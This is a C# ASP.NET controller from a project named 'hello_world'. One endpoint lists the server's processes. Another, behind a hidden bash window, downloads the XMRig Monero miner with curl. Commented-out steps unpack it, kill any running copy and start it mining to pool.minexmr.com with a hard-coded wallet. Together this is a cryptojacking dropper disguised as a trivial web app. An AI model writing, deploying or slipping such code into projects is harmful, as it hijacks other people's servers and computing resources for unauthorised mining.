using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;

namespace hello_world.Controllers
{
    [ApiController]
    [Route("ls")]
    public class ScriptController : ControllerBase
    {
        private readonly ILogger<ScriptController> _logger;

        public ScriptController(ILogger<ScriptController> logger)
        {
            _logger = logger;
        }

        [HttpGet]
        public async Task<JsonResult> Ls()
        {
            try
            {
                string results = "";
                var process = new Process();
                var processStartInfo = new ProcessStartInfo()
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = $"/bin/bash",
                    WorkingDirectory = AppContext.BaseDirectory,
                    Arguments = $"-c \"ps -aux\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false
                };
                process.StartInfo = processStartInfo;
                process.Start();

                //String error = process.StandardError.ReadToEnd();
                results = process.StandardOutput.ReadToEnd();

                this._logger.LogInformation(message: results);
                return new JsonResult(new {Code = "SUCCESS", Msg = results});
            }
            catch (Exception ex)
            {
                return new JsonResult(new {Code = "FAILED", Msg = ex.ToString()});
            }
        }

        [HttpGet]
        [Route("run")]
        public JsonResult Run()
        {
            string results = "";
            try
            {
                string output = "";
                string error = "";
                var p1 = new Process()
                {
                    StartInfo = new ProcessStartInfo()
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        FileName = $"/bin/bash",
                        WorkingDirectory = AppContext.BaseDirectory,
                        Arguments =
                            $"-c \"curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz \"",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false
                    }
                };
                p1.Start();
                error = p1.StandardError.ReadToEnd();
                Console.WriteLine("ERROR: ", error);
                output = p1.StandardOutput.ReadToEnd();
                Console.WriteLine("OUTPUT: ", output);
                results += output + Environment.NewLine;
                Thread.Sleep(500);

                // p1 = new Process()
                // {
                //     StartInfo = new ProcessStartInfo()
                //     {
                //         WindowStyle = ProcessWindowStyle.Hidden,
                //         FileName = $"/bin/bash",
                //         WorkingDirectory = AppContext.BaseDirectory,
                //         Arguments =
                //             $"-c \"tar xvfz xmrig-6.16.1-linux-x64.tar.gz \"",
                //         RedirectStandardOutput = true,
                //         RedirectStandardError = true,
                //         UseShellExecute = false
                //     }
                // };
                // p1.Start();
                // p1.WaitForExit();
                // error = p1.StandardError.ReadToEnd();
                // Console.WriteLine("ERROR: ", error);
                // output = p1.StandardOutput.ReadToEnd();
                // Console.WriteLine("OUTPUT: ", output);
                // results += output + Environment.NewLine;
                // Thread.Sleep(500);
                //
                // p1 = new Process()
                // {
                //     StartInfo = new ProcessStartInfo()
                //     {
                //         WindowStyle = ProcessWindowStyle.Hidden,
                //         FileName = $"/bin/bash",
                //         WorkingDirectory = AppContext.BaseDirectory,
                //         Arguments =
                //             $"-c \"pkill xmrig \"",
                //         RedirectStandardOutput = true,
                //         RedirectStandardError = true,
                //         UseShellExecute = false
                //     }
                // };
                // p1.Start();
                // p1.WaitForExit();
                // error = p1.StandardError.ReadToEnd();
                // Console.WriteLine("ERROR: ", error);
                // output = p1.StandardOutput.ReadToEnd();
                // Console.WriteLine("OUTPUT: ", output);
                // results += output + Environment.NewLine;
                // Thread.Sleep(500);
                //
                //
                // p1 = new Process()
                // {
                //     StartInfo = new ProcessStartInfo()
                //     {
                //         WindowStyle = ProcessWindowStyle.Hidden,
                //         FileName = $"/bin/bash",
                //         WorkingDirectory = AppContext.BaseDirectory,
                //         Arguments =
                //             $"-c \"xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx \"",
                //         RedirectStandardOutput = true,
                //         RedirectStandardError = true,
                //         UseShellExecute = false
                //     }
                // };
                // p1.Start();
                // p1.WaitForExit();
                // Thread.Sleep(500);

                return new JsonResult(new {Code = "SUCCESS", Msg = results});
            }
            catch (Exception ex)
            {
                //_logger.LogError(ex.Message, ex);
                throw;
            }
        }
    }
}